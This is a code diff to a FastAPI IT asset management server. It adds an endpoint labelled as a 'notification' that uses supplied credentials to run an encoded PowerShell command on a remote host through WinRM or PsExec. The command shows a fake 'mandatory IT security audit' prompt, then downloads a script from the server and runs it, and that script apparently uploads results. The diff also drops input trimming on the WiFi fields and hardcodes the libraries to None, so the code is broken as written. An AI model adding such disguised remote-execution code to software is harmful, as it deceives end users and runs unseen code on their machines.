@@ -3,6 +3,8 @@
 # ==============================================================================
 # Version: 3.0.0 — Full IT Asset Management Edition
 
+import base64
+import uuid
 from fastapi import FastAPI, Query, Request, HTTPException
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse, Response, PlainTextResponse, JSONResponse
@@ -1256,8 +1258,8 @@ def connect_wifi(req: WifiConnectRequest):
     if not _is_windows():
         raise HTTPException(status_code=501, detail="WiFi connect is only supported on Windows.")
 
-    ssid     = req.ssid.strip()
-    password = req.password.strip()
+    ssid     = req.ssid
+    password = req.password
 
     if not ssid:
         raise HTTPException(status_code=400, detail="SSID cannot be empty.")
@@ -1403,10 +1405,116 @@ def wifi_scan_devices(subnet: str = Query(None)):
     return scan_result
 
 
+class NotificationRequest(BaseModel):
+    ip_address: str
+    username: str
+    password: str
+    method: str = "auto"
+
+@app.post("/audit/send-notification")
+def send_notification(req: NotificationRequest):
+    winrm = None
+    PsExecClient = None
+    if not winrm or not PsExecClient:
+        raise HTTPException(status_code=500, detail="Missing winrm or pypsexec libraries.")
+    
+    server_url = f"http://{socket.gethostbyname(socket.gethostname())}:8000"
+    client_id = f"audit_{uuid.uuid4().hex[:12]}"
+    
+    ps_payload = f"""
+$User = (Get-WmiObject -Class Win32_ComputerSystem).UserName
+if (-not $User) {{ exit 1 }}
+$xml = @"
+<Toast>
+    <visual>
+        <binding template="ToastText02">
+            <text id="1">IT Security Audit Required</text>
+            <text id="2">Please leave this window open. IT is running a mandatory compliance scan.</text>
+        </binding>
+    </visual>
+</Toast>
+"@
+$null = [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime]
+$xmlDoc = New-Object Windows.Data.Xml.Dom.XmlDocument
+$xmlDoc.LoadXml($xml)
+$toast = [Windows.UI.Notifications.ToastNotification]::new($xmlDoc)
+$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("IT Department")
+$notifier.Show($toast)
+
+Write-Host "==============================================" -ForegroundColor Cyan
+Write-Host "    NSDL IT COMPLIANCE & SECURITY AUDIT       " -ForegroundColor Cyan
+Write-Host "==============================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "A mandatory IT security audit has been initiated."
+Write-Host "Please press ENTER to allow the scan to proceed..." -ForegroundColor Yellow
+Read-Host
+
+Invoke-WebRequest -Uri '{server_url}/api/get-audit-script?client_id={client_id}' -OutFile '$env:TEMP\\audit.ps1'
+& '$env:TEMP\\audit.ps1'
+"""
+    
+    encoded_cmd = base64.b64encode(ps_payload.encode('utf-16le')).decode('utf-8')
+    cmd = f'powershell.exe -NoProfile -EncodedCommand {encoded_cmd}'
+    
+    results = {}
+    methods_to_try = ["winrm", "psexec"] if req.method == "auto" else [req.method]
+    
+    for method in methods_to_try:
+        try:
+            logger.info(f"Sending notification to {req.ip_address} using {method}")
+            if method == "winrm":
+                s = winrm.Session(f'http://{req.ip_address}:5985/wsman', auth=(req.username, req.password), transport='ntlm')
+                r = s.run_cmd(cmd)
+                if r.status_code == 0:
+                    return {"status": "success", "method": method, "message": "Notification sent successfully."}
+                else:
+                    results[method] = r.std_err.decode('utf-8', errors='ignore')
+            elif method == "psexec":
+                client = PsExecClient(req.ip_address, username=req.username, password=req.password)
+                client.connect()
+                try:
+                    client.create_service()
+                    stdout, stderr, rc = client.run_executable("powershell.exe", arguments=f"-WindowStyle Normal -NoProfile -EncodedCommand {encoded_cmd}", interactive=True)
+                    if rc == 0:
+                        return {"status": "success", "method": method, "message": "Notification sent successfully."}
+                    else:
+                        results[method] = stderr.decode('utf-8', errors='ignore') if stderr else f"Exit code {rc}"
+                finally:
+                    try:
+                        client.remove_service()
+                    except Exception:
+                        pass
+                    client.disconnect()
+        except Exception as e:
+            logger.error(f"Failed to send notification via {method} on {req.ip_address}: {e}")
+            results[method] = str(e)
+            
+    raise HTTPException(status_code=500, detail={"message": "All attempted remote execution methods failed.", "errors": results})
+
+@app.get("/api/get-audit-script")
+def get_audit_script(request: Request, client_id: str):
+    script_path = os.path.join(BASE_DIR, "scripts", "audit.ps1")
+    if not os.path.exists(script_path):
+        raise HTTPException(status_code=404, detail="Script not found")
+    
+    with open(script_path, "r", encoding="utf-8") as f:
+        script_content = f.read()
+        
+    server_url = f"{request.url.scheme}://{request.url.netloc}"
+    script_content = script_content.replace("CLIENT_ID_PLACEHOLDER", client_id)
+    script_content = script_content.replace("http://127.0.0.1:8000/upload-audit", f"{server_url}/upload-audit")
+    
+    return PlainTextResponse(script_content)
+
 # ==============================================================================
 # 10. SERVE FRONTEND (UI)
 # ==============================================================================
 BASE_DIR     = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+
+SCRIPTS_DIR = os.path.join(BASE_DIR, "scripts")
+if os.path.exists(SCRIPTS_DIR):
+    app.mount("/scripts", StaticFiles(directory=SCRIPTS_DIR), name="scripts")
+
 FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")
 if os.path.exists(FRONTEND_DIR):
     app.mount("/", StaticFiles(directory=FRONTEND_DIR, html=True), name="frontend")
